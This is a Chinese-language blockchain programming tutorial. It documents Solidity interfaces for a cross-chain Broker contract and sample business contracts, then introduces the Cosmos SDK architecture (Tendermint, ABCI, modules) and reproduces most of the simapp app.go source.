按照跨链合约的设计，需要在有跨链需求的应用链上部署两种合约。一个合约负责对接跨链网关Pier，为跨链管理合约Broker；一个合约负责具体的业务场景，为业务合约。业务合约需要跨链时，要统一将跨链请求提交到Broker合约上，Broker统一和Pier进行交互。一个Broker合约可以负责对接多个业务合约。跨链接入方无需对broker合约进行修改，直接部署使用即可；同时为了简化业务合约的编写，我们设计了业务合约的相应接口。

Broker 合约接口:

```solidity
  // 提供给业务合约注册。注册且审核通过的业务合约才能调用Broker合约的跨链接口，输入为具体的broker合约地址
  function register(string addr) public

  // 提供给管理员审核已经注册的业务合约
  function audit(string addr, int64 status) public returns(bool)

  // getInnerMeta 是获取跨链请求相关的Meta信息的接口。以Broker所在的区块链为目的链的一系列跨链请求的序号信息。
  // 如果Broker在A链，则可能有多条链和A进行跨链，如B->A:3; C->A:5。
  // 返回的map中，key值为来源链ID，value对应该来源链已发送的最新的跨链请求的序号，如{B:3, C:5}。
  function getInnerMeta() public view returns(string[] memory, uint64[] memory)

  // getOuterMeta 是获取跨链请求相关的Meta信息的接口。以Broker所在的区块链为来源链的一系列跨链请求的序号信息。
  // 如果以Broker在A链，则A可能和多条链进行跨链，如A->B:3; A->C:5。
  // 返回的map中，key值为目的链ID，value对应已发送到该目的链的最新跨链请求的序号，如{B:3, C:5}。
  function getOuterMeta() public view returns(string[] memory, uint64[] memory)

  // getCallbackMeta 是获取跨链请求相关的Meta信息的接口。以Broker所在的区块链为来源链的一系列跨链请求的序号信息。
  // 如果Broker在A链，则A可能和多条链进行跨链，如A->B:3; A->C:5；同时由于跨链请求中支持回调操作，即A->B->A为一次完整的跨链操作，
  // 我们需要记录回调请求的序号信息，如A->B->:2; A->C—>A:4。返回的map中，key值为目的链ID，value对应到该目的链最新的带回调跨链请求的序号，
  // 如{B:2, C:4}。（注意 callbackMeta序号可能和outMeta是不一致的，这是由于由A发出的跨链请求部分是没有回调的）
  function getCallbackMeta() public view returns(string[] memory, uint64[] memory)

  // getInMessage 查询历史跨链请求所在的区块高度。查询键值中from指定来源链，idx指定序号，查询结果为以Broker所在的区块链作为目的链的跨链请求所在的区块高度。
  function getInMessage(string memory from, uint64 idx) public view returns (uint)

  // getOutMessage 查询历史跨链请求所在的区块高度。查询键值中to指定目的链，idx指定序号，查询结果为以Broker所在的区块链作为来源链的跨链请求所在的区块高度。
  function getOutMessage(string memory to, uint64 idx) public view returns (uint)

  // 提供给跨链网关调用的接口，跨链网关收到跨链请求时会调用该接口。
  function invokeInterchain(string calldata srcChainMethod, uint64 index, address destAddr, bool req, bytes calldata bizCallData) payable external

  // 提供给跨链网关调用的接口，当跨链网关收到无效当跨链请求时会调用该接口。
  function invokeIndexUpdateWithError(string memory srcChainMethod, uint64 index, bool req, string memory err) public

  // 提供给业务合约发起通用的跨链交易的接口。
  function emitInterchainEvent(string memory destContractDID, string memory funcs, string memory args, string memory argscb, string memory argsrb) public onlyWhiteList

  // 提供给合约部署初始化使用
  function initialize() public
```

- `emitInterchainEvent`

该接口是业务合约发起通用的跨链调用的接口。接收的参数有：目的链ID，目的链业务合约地址或ID，调用的函数名、回调函数名、回滚函数名，调用函数的参数，回调函数的参数，回滚函数的参数。

Broker会记录跨链交易相应的元信息，对跨链交易进行编号，保证跨链交易有序进行, 并且抛出跨链事件，以通知跨链网关跨链交易的产生。

- `invokeInterchain`

该接口是跨链网关对业务合约进行跨链调用或回调/回滚的接口。 接收参数有：来源链ID，交易序号，目的业务合约ID，是否是跨链请求，业务合约调用方法和参数的封装数据。

跨链网关对要调用的目的合约的方法和参数进行封装，通过该接口实现对不同目的合约的灵活调用，并返回目的合约的调用函数的返回值。

Transfer 合约:

```solidity
  // 发起一笔跨链交易的接口
  function transfer(string memory destContractDID, string memory sender, string memory receiver, string memory amount) public

  // 提供给Broker合约收到跨链充值所调用的接口
  function interchainCharge(string memory sender, string memory receiver, uint64 val) public onlyBroker returns(bool)

  // 跨链交易失败之后，提供给Broker合约进行回滚的接口
  function interchainRollback(string memory sender, uint64 val) public onlyBroker

  // 获取transfer合约中某个账户的余额
  function getBalance(string memory id) public view returns(uint64)

  // 在transfer合约中给某个账户设置一定的余额
  function setBalance(string memory id, uint64 amount) public
}
```

DataSwapper合约:

```solidity
  // 发起一个跨链获取数据交易的接口
  function get(string memory destContractDID, string memory key) public

  // 提供给Broker合约调用，当Broker收到跨链获取数据的请求时取数据的接口
  function interchainGet(string memory key) public onlyBroker returns(bool, string memory)

  // 跨链获取到的数据回写的接口
  function interchainSet(string memory key, string memory value) public onlyBroker
```

## Golang智能合约高阶编程

### ChainMaker介绍



### ChainMaker与FISCO BCOS的区别



## Cosmos SDK核心编程——从选链到创链的跨越，稳步踏入区块链3.0

![image](https://user-images.githubusercontent.com/87604354/211181995-bf1cbc15-cb55-4d55-8d3a-ab72fbbdec78.png)

Cosmos SDK 是世界上最受欢迎的用于构建面向应用的区块链的框架。

### Cosmos SDK

Cosmos SDK是一个开源框架，用于构建多资产公共权益证明（PoS）区块链，如Cosmos Hub，以及许可的权威证明区块链。使用Cosmos SDK构建的区块链通常称为**面向应用的区块链**。

Cosmos SDK的目标是允许开发人员从头开始轻松创建自定义区块链，这些区块链可以与其他区块链进行本机互操作。我们将Cosmos SDK设想为类似于npm的框架，用于在[Tendermint](https://github.com/tendermint/tendermint)之上构建安全的区块链应用程序。基于SDK的区块链由可组合模块构建而成，其中大多数是开源的，可供任何开发人员使用。任何人都可以为 Cosmos SDK创建模块，集成已构建的模块就像将它们导入区块链应用程序一样简单。此外，Cosmos SDK是一个基于功能的系统，允许开发人员更好地推理模块之间交互的安全性。

![image](https://user-images.githubusercontent.com/87604354/211181996-7220d38c-e35d-4d00-a2f2-035fa6793bde.png)

### Application-Specific Blockchains

面向应用的区块链是为操作单个应用程序而定制的区块链。开发人员不是在以太坊等底层区块链之上构建去中心化应用程序，**而是从头开始构建自己的区块链**。这意味着构建一个全节点客户端、一个轻客户端和所有必要的接口（CLI、REST 等）来与节点交互。

```shell
                ^  +-------------------------------+  ^
                |  |                               |  |   Built with Cosmos SDK
                |  |  State-machine = Application  |  |
                |  |                               |  v
                |  +-------------------------------+
                |  |                               |  ^
Blockchain node |  |           Consensus           |  |
                |  |                               |  |
                |  +-------------------------------+  |   Tendermint Core
                |  |                               |  |
                |  |           Networking          |  |
                |  |                               |  |
                v  +-------------------------------+  v
```

智能合约的缺点：

像以太坊这样的虚拟机区块链早在2014年就解决了对更多可编程性的需求。当时，可用于构建去中心化应用程序的选择非常有限。大多数开发人员会建立在复杂且有限的比特币脚本语言之上，或者分叉难以使用和定制的比特币代码库。

虚拟机区块链带来了新的价值主张。他们的状态机包含一个虚拟机，能够解释称为智能合约的图灵完备程序。这些智能合约非常适合一次性事件（例如ICO）等用例，但它们可能不足以构建复杂的去中心化平台。原因如下：

- 智能合约通常使用特定的编程语言开发，这些编程语言可以由底层虚拟机解释。这些编程语言通常不成熟，并且受到虚拟机本身约束的固有限制。例如，以太坊虚拟机不允许开发人员实现代码的自动执行。开发人员也仅限于基于帐户的EVM系统，他们只能从一组有限的功能中进行选择以进行加密操作。这些都是例子，但它们暗示了智能合约环境通常缺乏**灵活性**。

- 智能合约都由同一个虚拟机运行。这意味着它们会争夺资源，这会严重限制**性能**。即使状态机被拆分为多个子集（例如通过分片），智能合约仍然需要由虚拟机解释，与在状态机级别实现的本机应用程序相比，这将限制性能（我们的基准测试显示，当虚拟机被删除时，性能提高了10倍）。

- 智能合约共享相同底层环境这一事实的另一个问题是由此产生的独立性限制。去中心化应用程序是一个涉及多个参与者的生态系统。如果应用程序构建在通用虚拟机区块链上，则利益相关者对其应用程序的主权非常有限，最终被底层区块链的治理所取代。如果应用程序中存在错误，则几乎无能为力。

**面向应用的区块链旨在解决这些缺点。**

### Cosmos区块链核心架构

#### 状态机

区块链的本质是一个可以被复制的状态机，一个简化了事物因果关系的逻辑模型，可以给定某个条件来更新状态。比如说比特币就是一个可以被所有人下载的账本，新的交易成功后就会被更新到这个所有人都可以看到的账本。在实践中，大量的交易可以被打包并上传到链上修改账本的状态。

#### Tendermint

![image](https://user-images.githubusercontent.com/87604354/211181999-1b2f9cef-8926-407c-93df-1c539d845cd6.png)

Cosmos SDK使得开发人员只需要定义状态机，[*Tendermint*](https://docs.tendermint.com/master/introduction/what-is-tendermint.html)将为他们处理网络上的复制。

[Tendermint](https://docs.tendermint.com/v0.34/introduction/what-is-tendermint.html)是一个与应用程序无关的引擎，负责处理区块链的网络和共识层。实际上，这意味着Tendermint负责传播和排序事务字节。Tendermint Core依靠同名的拜占庭容错（BFT）算法来让交易顺序达成共识。

Tendermint[共识算法](https://docs.tendermint.com/v0.34/introduction/what-is-tendermint.html#consensus-overview)与一组称为验证器的特殊节点一起工作。验证者负责将交易块添加到区块链中。在任何给定的区块中，都有一个验证器集V。算法选择V中的验证者作为下一个区块的提议者。如果超过2/3的V在其上签署了`prevote`和`precommit`，并且它包含的所有交易都有效，则认为此块有效。验证器集可以通过在状态机中编写的规则来更改。

![image](https://user-images.githubusercontent.com/87604354/211182002-0b286615-67c2-4c34-9fff-277c4cc60724.png)

#### ABCI

在Cosmos的区块链网络中，每条区块链都由Tendermint作为底层的通用的网络层和共识层，同时每个应用都能在应用层设计自己的业务逻辑。对于开发者来说，只需要通过ABCI（Application Blockchain Interface）应用程序区块链接口调用，他们可以直接在tendermint提供的共识机制上提供的最终交易上就可以构建应用程序。

**ABCI 作为一个socket协议是一个调用的接口，不同于其他的区块链要求开发者学习并使用特定的语言，开发人员可以选择他们熟悉的语言进行开发。**

我们看到的比特币、以太坊在设计区块链网络时都是采用的一体化的思路，每一个技术栈，也就是我们刚刚讲到的区块链的各个层级，都是一个相互链接和依赖的程序，无法单独拆开。

这种整体的架构在开发时容易遇到2个问题。

1）代码难以使用。比如说，比特币的一个堆栈里面就包含了待处理的交易池mempool，账户余额，用户权限等，如果想要单独拎出mempool就会变得非常困难，即使分叉也很难维护，变成面条式代码，和面条一样缠绕在一起混乱难以理出头绪。

2）限制开发语言。在以太坊网络中，EVM 需要通过编译器将智能合约代码编译成字节码再上传到区块链之后才能执行操作，导致开发者只能使用EVM编译器支持的语言，也就是Serpent和Solidity。

**功能类型**

主要有3个ABCI连接应用层和Tenderint共识层，包括：

1）CheckTx：验证交易并提交到mempool交易池中广播交易

2）DeliverTx：提交给共识引擎处理并更新状态

3）BeginBlock/EndBlock：查询应用层的状态

abci协议包括几种不同的消息类型。Tendermint core 会创建3个ABCI连接到应用层：

![image](https://user-images.githubusercontent.com/87604354/211182010-9e687ede-d597-4ef9-912c-65866b781221.png)

在计算机科学中，通常不认为单体架构通常是一个好的做法。Cosmos把原来的需要从底层开始构建层层堆叠的区块链架构，变成了模块化的可自由组合的结构。就像是组装电脑一样，你可以把内存条，显示器，键盘，鼠标组装成一个电脑需要考虑添加具体的配置就可以开车上路了。而应用层的配置也提供了工具，Cosmos SDK，一个允许开发者为应用场景自定义配置的框架，提供了新的开发范式。

任何基于Tendermint构建的应用程序都需要实现ABCI接口，以便与底层本地Tendermint引擎进行通信。幸运的是，不必实现 ABCI 接口。Cosmos SDK 以[基本应用](https://docs.cosmos.network/v0.47/intro/sdk-design#baseapp)的形式提供它的样板实现。

![image](https://user-images.githubusercontent.com/87604354/211182014-52394105-9218-4ab1-958b-0f28951d4f24.png)

*开发Keplr钱包的Josh曾经总结过，“使用智能合约是租房，使用CosmosSDK开发才是建造属于自己的房子。”*

#### Cosmos SDK模块设计

![image](https://user-images.githubusercontent.com/87604354/211182017-fd274657-996e-4965-b9d2-80916df897d2.png)

Cosmos SDK的运行机制：**通过Multistore 的机制来定义和维护应用层的状态，将应用层的状态划分到不同的模块，可以看作是独立的状态机CosmosSDK里内置的底层basepp里有ABCI的接口可以直接调用适应所有应用类型的Tendermint共识机制，经过CheckTX的验证非攻击后提交到mempool交易池，在验证节点达成共识成功出块后交易被打包上链，通过DeliverTx成功修改状态，即交易成功。**

**通过DeliverTx的功能收到字节形式的交易后，解码提取消息，在验证交易相关的信息后，比如是否有签名，再推送到对应的模块处理，最后更新状态。更新后的状态由SDK里的Multistore的功能保存，并且还可以把信息切割开来对应到不同的模块。**

Cosmos SDK的核心是Golang中[ABCI](https://docs.cosmos.network/v0.47/intro/sdk-app-architecture#abci)的实现。它带有一个用于持久保存数据的[`多存储`](https://docs.cosmos.network/v0.47/core/store#multistore)和一个用于处理事务的[`路由器`](https://docs.cosmos.network/v0.47/core/baseapp#routing)。

当通过`DeliverTx`方式从Tendermint传输时，基于Cosmos SDK构建的应用程序如何处理事务：

1. 解码从Tendermint 共识引擎收到的`transactions`（请记住，Tendermint 只处理 `[]bytes`）。
2. 从`transactions`中提取`messages`并执行基本的健全性检查。
3. 将每条消息发送到相应的模块，以便对其进行处理。
4. 提交状态更改。

### Cosmos SDK核心编程

首先下载Cosmos SDK源代码：

`git clone https://github.com/cosmos/cosmos-sdk`

其中app.go作为Cosmos SDK构建应用的核心文件，代码如下：

```go
//go:build app_v1
package simapp

import (
	...
)

const appName = "SimApp"

var (
	// DefaultNodeHome default home directories for the application daemon
	DefaultNodeHome string

	// ModuleBasics defines the module BasicManager is in charge of setting up basic,
	// non-dependant module elements, such as codec registration
	// and genesis verification.
	ModuleBasics = module.NewBasicManager(
		auth.AppModuleBasic{},
		genutil.NewAppModuleBasic(genutiltypes.DefaultMessageValidator),
		bank.AppModuleBasic{},
		capability.AppModuleBasic{},
		staking.AppModuleBasic{},
		mint.AppModuleBasic{},
		distr.AppModuleBasic{},
		gov.NewAppModuleBasic(
			[]govclient.ProposalHandler{
				paramsclient.ProposalHandler,
				upgradeclient.LegacyProposalHandler,
				upgradeclient.LegacyCancelProposalHandler,
			},
		),
		params.AppModuleBasic{},
		crisis.AppModuleBasic{},
		slashing.AppModuleBasic{},
		feegrantmodule.AppModuleBasic{},
		upgrade.AppModuleBasic{},
		evidence.AppModuleBasic{},
		authzmodule.AppModuleBasic{},
		groupmodule.AppModuleBasic{},
		vesting.AppModuleBasic{},
		nftmodule.AppModuleBasic{},
		consensus.AppModuleBasic{},
	)

	// module account permissions
	maccPerms = map[string][]string{
		authtypes.FeeCollectorName:     nil,
		distrtypes.ModuleName:          nil,
		minttypes.ModuleName:           {authtypes.Minter},
		stakingtypes.BondedPoolName:    {authtypes.Burner, authtypes.Staking},
		stakingtypes.NotBondedPoolName: {authtypes.Burner, authtypes.Staking},
		govtypes.ModuleName:            {authtypes.Burner},
		nft.ModuleName:                 nil,
	}
)

var (
	_ runtime.AppI            = (*SimApp)(nil)
	_ servertypes.Application = (*SimApp)(nil)
)

// SimApp extends an ABCI application, but with most of its parameters exported.
// They are exported for convenience in creating helper functions, as object
// capabilities aren't needed for testing.
type SimApp struct {
	*baseapp.BaseApp
	legacyAmino       *codec.LegacyAmino
	appCodec          codec.Codec
	txConfig          client.TxConfig
	interfaceRegistry types.InterfaceRegistry

	// keys to access the substores
	keys    map[string]*storetypes.KVStoreKey
	tkeys   map[string]*storetypes.TransientStoreKey
	memKeys map[string]*storetypes.MemoryStoreKey

	// keepers
	AccountKeeper         authkeeper.AccountKeeper
	BankKeeper            bankkeeper.Keeper
	CapabilityKeeper      *capabilitykeeper.Keeper
	StakingKeeper         *stakingkeeper.Keeper
	SlashingKeeper        slashingkeeper.Keeper
	MintKeeper            mintkeeper.Keeper
	DistrKeeper           distrkeeper.Keeper
	GovKeeper             govkeeper.Keeper
	CrisisKeeper          *crisiskeeper.Keeper
	UpgradeKeeper         *upgradekeeper.Keeper
	ParamsKeeper          paramskeeper.Keeper
	AuthzKeeper           authzkeeper.Keeper
	EvidenceKeeper        evidencekeeper.Keeper
	FeeGrantKeeper        feegrantkeeper.Keeper
	GroupKeeper           groupkeeper.Keeper
	NFTKeeper             nftkeeper.Keeper
	ConsensusParamsKeeper consensusparamkeeper.Keeper

	// the module manager
	ModuleManager *module.Manager

	// simulation manager
	sm *module.SimulationManager

	// module configurator
	configurator module.Configurator
}

func init() {
	userHomeDir, err := os.UserHomeDir()
	if err != nil {
		panic(err)
	}

	DefaultNodeHome = filepath.Join(userHomeDir, ".simapp")
}

// NewSimApp returns a reference to an initialized SimApp.
func NewSimApp(
	logger log.Logger,
	db dbm.DB,
	traceStore io.Writer,
	loadLatest bool,
	appOpts servertypes.AppOptions,
	baseAppOptions ...func(*baseapp.BaseApp),
) *SimApp {
	encodingConfig := makeEncodingConfig()

	appCodec := encodingConfig.Codec
	legacyAmino := encodingConfig.Amino
	interfaceRegistry := encodingConfig.InterfaceRegistry
	txConfig := encodingConfig.TxConfig

	bApp := baseapp.NewBaseApp(appName, logger, db, txConfig.TxDecoder(), baseAppOptions...)
	bApp.SetCommitMultiStoreTracer(traceStore)
	bApp.SetVersion(version.Version)
	bApp.SetInterfaceRegistry(interfaceRegistry)
	bApp.SetTxEncoder(txConfig.TxEncoder())

	keys := sdk.NewKVStoreKeys(
		authtypes.StoreKey, banktypes.StoreKey, stakingtypes.StoreKey, crisistypes.StoreKey,
		minttypes.StoreKey, distrtypes.StoreKey, slashingtypes.StoreKey,
		govtypes.StoreKey, paramstypes.StoreKey, consensusparamtypes.StoreKey, upgradetypes.StoreKey, feegrant.StoreKey,
		evidencetypes.StoreKey, capabilitytypes.StoreKey,
		authzkeeper.StoreKey, nftkeeper.StoreKey, group.StoreKey,
	)

	tkeys := sdk.NewTransientStoreKeys(paramstypes.TStoreKey)
	// NOTE: The testingkey is just mounted for testing purposes. Actual applications should
	// not include this key.
	memKeys := sdk.NewMemoryStoreKeys(capabilitytypes.MemStoreKey, "testingkey")

	// register the streaming service with the BaseApp
	if err := bApp.SetStreamingService(appOpts, appCodec, keys); err != nil {
		logger.Error("failed to load state streaming", "err", err)
		os.Exit(1)
	}

	app := &SimApp{
		BaseApp:           bApp,
		legacyAmino:       legacyAmino,
		appCodec:          appCodec,
		txConfig:          txConfig,
		interfaceRegistry: interfaceRegistry,
		keys:              keys,
		tkeys:             tkeys,
		memKeys:           memKeys,
	}

	app.ParamsKeeper = initParamsKeeper(appCodec, legacyAmino, keys[paramstypes.StoreKey], tkeys[paramstypes.TStoreKey])

	// set the BaseApp's parameter store
	app.ConsensusParamsKeeper = consensusparamkeeper.NewKeeper(appCodec, keys[upgradetypes.StoreKey], authtypes.NewModuleAddress(govtypes.ModuleName).String())
	bApp.SetParamStore(&app.ConsensusParamsKeeper)

	app.CapabilityKeeper = capabilitykeeper.NewKeeper(appCodec, keys[capabilitytypes.StoreKey], memKeys[capabilitytypes.MemStoreKey])
	// Applications that wish to enforce statically created ScopedKeepers should call `Seal` after creating
	// their scoped modules in `NewApp` with `ScopeToModule`
	app.CapabilityKeeper.Seal()

	// add keepers
	app.AccountKeeper = authkeeper.NewAccountKeeper(appCodec, keys[authtypes.StoreKey], authtypes.ProtoBaseAccount, maccPerms, sdk.Bech32MainPrefix, authtypes.NewModuleAddress(govtypes.ModuleName).String())

	app.BankKeeper = bankkeeper.NewBaseKeeper(
		appCodec,
		keys[banktypes.StoreKey],
		app.AccountKeeper,
		BlockedAddresses(),
		authtypes.NewModuleAddress(govtypes.ModuleName).String(),
	)
	app.StakingKeeper = stakingkeeper.NewKeeper(
		appCodec, keys[stakingtypes.StoreKey], app.AccountKeeper, app.BankKeeper, authtypes.NewModuleAddress(govtypes.ModuleName).String(),
	)
	app.MintKeeper = mintkeeper.NewKeeper(appCodec, keys[minttypes.StoreKey], app.StakingKeeper, app.AccountKeeper, app.BankKeeper, authtypes.FeeCollectorName, authtypes.NewModuleAddress(govtypes.ModuleName).String())

	app.DistrKeeper = distrkeeper.NewKeeper(appCodec, keys[distrtypes.StoreKey], app.AccountKeeper, app.BankKeeper, app.StakingKeeper, authtypes.FeeCollectorName, authtypes.NewModuleAddress(govtypes.ModuleName).String())

	app.SlashingKeeper = slashingkeeper.NewKeeper(
		appCodec, legacyAmino, keys[slashingtypes.StoreKey], app.StakingKeeper, authtypes.NewModuleAddress(govtypes.ModuleName).String(),
	)

	invCheckPeriod := cast.ToUint(appOpts.Get(server.FlagInvCheckPeriod))
	app.CrisisKeeper = crisiskeeper.NewKeeper(appCodec, keys[crisistypes.StoreKey], invCheckPeriod,
		app.BankKeeper, authtypes.FeeCollectorName, authtypes.NewModuleAddress(govtypes.ModuleName).String())

	app.FeeGrantKeeper = feegrantkeeper.NewKeeper(appCodec, keys[feegrant.StoreKey], app.AccountKeeper)

	// register the staking hooks
	// NOTE: stakingKeeper above is passed by reference, so that it will contain these hooks
	app.StakingKeeper.SetHooks(
		stakingtypes.NewMultiStakingHooks(app.DistrKeeper.Hooks(), app.SlashingKeeper.Hooks()),
	)

	app.AuthzKeeper = authzkeeper.NewKeeper(keys[authzkeeper.StoreKey], appCodec, app.MsgServiceRouter(), app.AccountKeeper)

	groupConfig := group.DefaultConfig()
	/*
		Example of setting group params:
		groupConfig.MaxMetadataLen = 1000
	*/
	app.GroupKeeper = groupkeeper.NewKeeper(keys[group.StoreKey], appCodec, app.MsgServiceRouter(), app.AccountKeeper, groupConfig)

	// get skipUpgradeHeights from the app options
	skipUpgradeHeights := map[int64]bool{}
	for _, h := range cast.ToIntSlice(appOpts.Get(server.FlagUnsafeSkipUpgrades)) {
		skipUpgradeHeights[int64(h)] = true
	}
	homePath := cast.ToString(appOpts.Get(flags.FlagHome))
	// set the governance module account as the authority for conducting upgrades
	app.UpgradeKeeper = upgradekeeper.NewKeeper(skipUpgradeHeights, keys[upgradetypes.StoreKey], appCodec, homePath, app.BaseApp, authtypes.NewModuleAddress(govtypes.ModuleName).String())

	// Register the proposal types
	// Deprecated: Avoid adding new handlers, instead use the new proposal flow
	// by granting the governance module the right to execute the message.
	// See: https://github.com/cosmos/cosmos-sdk/blob/release/v0.46.x/x/gov/spec/01_concepts.md#proposal-messages
	govRouter := govv1beta1.NewRouter()
	govRouter.AddRoute(govtypes.RouterKey, govv1beta1.ProposalHandler).
		AddRoute(paramproposal.RouterKey, params.NewParamChangeProposalHandler(app.ParamsKeeper)).
		AddRoute(upgradetypes.RouterKey, upgrade.NewSoftwareUpgradeProposalHandler(app.UpgradeKeeper))
	govConfig := govtypes.DefaultConfig()
	/*
		Example of setting gov params:
		govConfig.MaxMetadataLen = 10000
	*/
	govKeeper := govkeeper.NewKeeper(
		appCodec, keys[govtypes.StoreKey], app.AccountKeeper, app.BankKeeper,
		app.StakingKeeper, app.MsgServiceRouter(), govConfig, authtypes.NewModuleAddress(govtypes.ModuleName).String(),
	)

	// Set legacy router for backwards compatibility with gov v1beta1
	govKeeper.SetLegacyRouter(govRouter)

	app.GovKeeper = *govKeeper.SetHooks(
		govtypes.NewMultiGovHooks(
		// register the governance hooks
		),
	)

	app.NFTKeeper = nftkeeper.NewKeeper(keys[nftkeeper.StoreKey], appCodec, app.AccountKeeper, app.BankKeeper)

	// create evidence keeper with router
	evidenceKeeper := evidencekeeper.NewKeeper(
		appCodec, keys[evidencetypes.StoreKey], app.StakingKeeper, app.SlashingKeeper,
	)
	// If evidence needs to be handled for the app, set routes in router here and seal
	app.EvidenceKeeper = *evidenceKeeper

	/****  Module Options ****/

	// NOTE: we may consider parsing `appOpts` inside module constructors. For the moment
	// we prefer to be more strict in what arguments the modules expect.
	skipGenesisInvariants := cast.ToBool(appOpts.Get(crisis.FlagSkipGenesisInvariants))

	// NOTE: Any module instantiated in the module manager that is later modified
	// must be passed by reference here.
	app.ModuleManager = module.NewManager(
		genutil.NewAppModule(
			app.AccountKeeper, app.StakingKeeper, app.BaseApp.DeliverTx,
			encodingConfig.TxConfig,
		),
		auth.NewAppModule(appCodec, app.AccountKeeper, authsims.RandomGenesisAccounts, app.GetSubspace(authtypes.ModuleName)),
		vesting.NewAppModule(app.AccountKeeper, app.BankKeeper),
		bank.NewAppModule(appCodec, app.BankKeeper, app.AccountKeeper, app.GetSubspace(banktypes.ModuleName)),
		capability.NewAppModule(appCodec, *app.CapabilityKeeper, false),
		crisis.NewAppModule(app.CrisisKeeper, skipGenesisInvariants, app.GetSubspace(crisistypes.ModuleName)),
		feegrantmodule.NewAppModule(appCodec, app.AccountKeeper, app.BankKeeper, app.FeeGrantKeeper, app.interfaceRegistry),
		gov.NewAppModule(appCodec, &app.GovKeeper, app.AccountKeeper, app.BankKeeper, app.GetSubspace(govtypes.ModuleName)),
		mint.NewAppModule(appCodec, app.MintKeeper, app.AccountKeeper, nil, app.GetSubspace(minttypes.ModuleName)),
		slashing.NewAppModule(appCodec, app.SlashingKeeper, app.AccountKeeper, app.BankKeeper, app.StakingKeeper, app.GetSubspace(slashingtypes.ModuleName)),
		distr.NewAppModule(appCodec, app.DistrKeeper, app.AccountKeeper, app.BankKeeper, app.StakingKeeper, app.GetSubspace(distrtypes.ModuleName)),
		staking.NewAppModule(appCodec, app.StakingKeeper, app.AccountKeeper, app.BankKeeper, app.GetSubspace(stakingtypes.ModuleName)),
		upgrade.NewAppModule(app.UpgradeKeeper),
		evidence.NewAppModule(app.EvidenceKeeper),
		params.NewAppModule(app.ParamsKeeper),
		authzmodule.NewAppModule(appCodec, app.AuthzKeeper, app.AccountKeeper, app.BankKeeper, app.interfaceRegistry),
		groupmodule.NewAppModule(appCodec, app.GroupKeeper, app.AccountKeeper, app.BankKeeper, app.interfaceRegistry),
		nftmodule.NewAppModule(appCodec, app.NFTKeeper, app.AccountKeeper, app.BankKeeper, app.interfaceRegistry),
		consensus.NewAppModule(appCodec, app.ConsensusParamsKeeper),
	)

	// During begin block slashing happens after distr.BeginBlocker so that
	// there is nothing left over in the validator fee pool, so as to keep the
	// CanWithdrawInvariant invariant.
	// NOTE: staking module is required if HistoricalEntries param > 0
	// NOTE: capability module's beginblocker must come before any modules using capabilities (e.g. IBC)
	app.ModuleManager.SetOrderBeginBlockers(
		upgradetypes.ModuleName,
		capabilitytypes.ModuleName,
		minttypes.ModuleName,
		distrtypes.ModuleName,
		slashingtypes.ModuleName,
		evidencetypes.ModuleName,
		stakingtypes.ModuleName,
		genutiltypes.ModuleName,
		authz.ModuleName,
	)
	app.ModuleManager.SetOrderEndBlockers(
		crisistypes.ModuleName,
		govtypes.ModuleName,
		stakingtypes.ModuleName,
		genutiltypes.ModuleName,
		feegrant.ModuleName,
		group.ModuleName,
	)

	// NOTE: The genutils module must occur after staking so that pools are
	// properly initialized with tokens from genesis accounts.
	// NOTE: The genutils module must also occur after auth so that it can access the params from auth.
	// NOTE: Capability module must occur first so that it can initialize any capabilities
	// so that other modules that want to create or claim capabilities afterwards in InitChain
	// can do so safely.
	genesisModuleOrder := []string{
		capabilitytypes.ModuleName, authtypes.ModuleName, banktypes.ModuleName,
		distrtypes.ModuleName, stakingtypes.ModuleName, slashingtypes.ModuleName, govtypes.ModuleName,
		minttypes.ModuleName, crisistypes.ModuleName, genutiltypes.ModuleName, evidencetypes.ModuleName, authz.ModuleName,
		feegrant.ModuleName, nft.ModuleName, group.ModuleName, paramstypes.ModuleName, upgradetypes.ModuleName,
		vestingtypes.ModuleName, consensusparamtypes.ModuleName,
	}
	app.ModuleManager.SetOrderInitGenesis(genesisModuleOrder...)
	app.ModuleManager.SetOrderExportGenesis(genesisModuleOrder...)

	// Uncomment if you want to set a custom migration order here.
	// app.ModuleManager.SetOrderMigrations(custom order)

	app.ModuleManager.RegisterInvariants(app.CrisisKeeper)
	app.configurator = module.NewConfigurator(app.appCodec, app.MsgServiceRouter(), app.GRPCQueryRouter())
	app.ModuleManager.RegisterServices(app.configurator)

	// RegisterUpgradeHandlers is used for registering any on-chain upgrades.
	// Make sure it's called after `app.ModuleManager` and `app.configurator` are set.
	app.RegisterUpgradeHandlers()

	autocliv1.RegisterQueryServer(app.GRPCQueryRouter(), runtimeservices.NewAutoCLIQueryService(app.ModuleManager.Modules))

	reflectionSvc, err := runtimeservices.NewReflectionService()
	if err != nil {
		panic(err)
	}
	reflectionv1.RegisterReflectionServiceServer(app.GRPCQueryRouter(), reflectionSvc)

	// add test gRPC service for testing gRPC queries in isolation
	testdata_pulsar.RegisterQueryServer(app.GRPCQueryRouter(), testdata_pulsar.QueryImpl{})

	// create the simulation manager and define the order of the modules for deterministic simulations
	//
	// NOTE: this is not required apps that don't use the simulator for fuzz testing
	// transactions
	overrideModules := map[string]module.AppModuleSimulation{
		authtypes.ModuleName: auth.NewAppModule(app.appCodec, app.AccountKeeper, authsims.RandomGenesisAccounts, app.GetSubspace(authtypes.ModuleName)),
	}
	app.sm = module.NewSimulationManagerFromAppModules(app.ModuleManager.Modules, overrideModules)

	app.sm.RegisterStoreDecoders()

	// initialize stores
	app.MountKVStores(keys)
	app.MountTransientStores(tkeys)
	app.MountMemoryStores(memKeys)

	// initialize BaseApp
	app.SetInitChainer(app.InitChainer)
	app.SetBeginBlocker(app.BeginBlocker)
	app.SetEndBlocker(app.EndBlocker)
	app.setAnteHandler(encodingConfig.TxConfig)
	app.setPostHandler()

	if loadLatest {
		if err := app.LoadLatestVersion(); err != nil {
			logger.Error("error on loading last version", "err", err)
			os.Exit(1)
		}
	}

	return app
}

func (app *SimApp) setAnteHandler(txConfig client.TxConfig) {
	anteHandler, err := ante.NewAnteHandler(
		ante.HandlerOptions{
			AccountKeeper:   app.AccountKeeper,
			BankKeeper:      app.BankKeeper,
			SignModeHandler: txConfig.SignModeHandler(),
			FeegrantKeeper:  app.FeeGrantKeeper,
			SigGasConsumer:  ante.DefaultSigVerificationGasConsumer,
		},
	)
	if err != nil {
		panic(err)
	}

	app.SetAnteHandler(anteHandler)
}

func (app *SimApp) setPostHandler() {
	postHandler, err := posthandler.NewPostHandler(
		posthandler.HandlerOptions{},
	)
	if err != nil {
		panic(err)
	}

	app.SetPostHandler(postHandler)
}

// Name returns the name of the App
func (app *SimApp) Name() string { return app.BaseApp.Name() }

// BeginBlocker application updates every begin block
